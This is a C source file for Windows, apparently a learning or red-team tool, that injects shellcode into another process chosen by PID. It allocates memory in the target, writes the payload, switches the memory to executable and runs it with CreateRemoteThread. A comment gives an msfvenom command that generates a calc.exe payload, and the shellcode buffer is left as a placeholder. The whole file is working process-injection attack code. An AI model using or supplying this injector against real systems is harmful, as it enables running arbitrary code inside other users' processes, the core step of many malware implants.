#include <Windows.h>
#include <stdio.h>

// Basic shellcode runner that injects into a remote thread
// Generate shellcode with: msfvenom -p windows/x64/exec CMD=calc.exe EXITFUNC=thread -f c

// Compile with: cl BasicShellcodeRunner.c

BOOL InjectRemoteThread(DWORD pid, PBYTE pShellcode, SIZE_T shellcodeSize) {
	SIZE_T numberOfBytesWritten = NULL;
	DWORD dwOldProtection = NULL;

	// Open a handle to target process (the one we're injecting into)
	HANDLE hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, pid);
	if (!hProcess) {
		printf("[-] OpenProcess failed with error: %d\n", GetLastError());
		return FALSE;
	}

	// Allocate RW memory for shellcode
	PVOID pShellcodeAddress = VirtualAllocEx(hProcess, NULL, shellcodeSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	if (!pShellcodeAddress) {
		printf("[-] VirtualAllocEx failed with error: %d\n", GetLastError());
		return FALSE;
	}
	printf("[+] Allocated memory for shellcode at 0x%p\n", pShellcodeAddress);

	// Write our shellcode to memory
	if (!WriteProcessMemory(hProcess, pShellcodeAddress, pShellcode, shellcodeSize, &numberOfBytesWritten)) {
		printf("[-] WriteProcessMemory failed with error: %d\n", GetLastError());
		return FALSE;
	}
	printf("[+] Successfully wrote %d bytes to memory\n", numberOfBytesWritten);

	// Remove shellcode from memory in our local process
	memset(pShellcode, '\0', shellcodeSize);

	// Change shellcode memory permissions to RX
	if (!VirtualProtectEx(hProcess, pShellcodeAddress, shellcodeSize, PAGE_EXECUTE_READ, &dwOldProtection)) {
		printf("[-] VirtualProtectEx failed with error : %d\n", GetLastError());
		return FALSE;
	}

	// Create remote thread in target process and execute shellcode
	HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, pShellcodeAddress, NULL, NULL, NULL);
	if (!hThread) {
		printf("[-] CreateRemoteThread failed with error: %d\n", GetLastError());
		return FALSE;
	}
	WaitForSingleObject(hThread, INFINITE);  // Wait for thread to finish execution
	CloseHandle(hThread);

	printf("[+] Shellcode executed!\n");

	// Free the memory we allocated for shellcode (this will not zero it out)
	VirtualFreeEx(hProcess, pShellcodeAddress, 0, MEM_RELEASE);
	CloseHandle(hProcess);

	return TRUE;
}

int main(int argc, char* argv[]) {
	if (argc < 2) {
		printf("Usage: %s [pid_to_inject]\n", argv[0]);
		return 1;
	}

	unsigned char buf[] = "shellcode_goes_here";
	
	if (!InjectRemoteThread(atoi(argv[1]), buf, sizeof(buf)-1)) {
		return 1;
	}

	return 0;
}
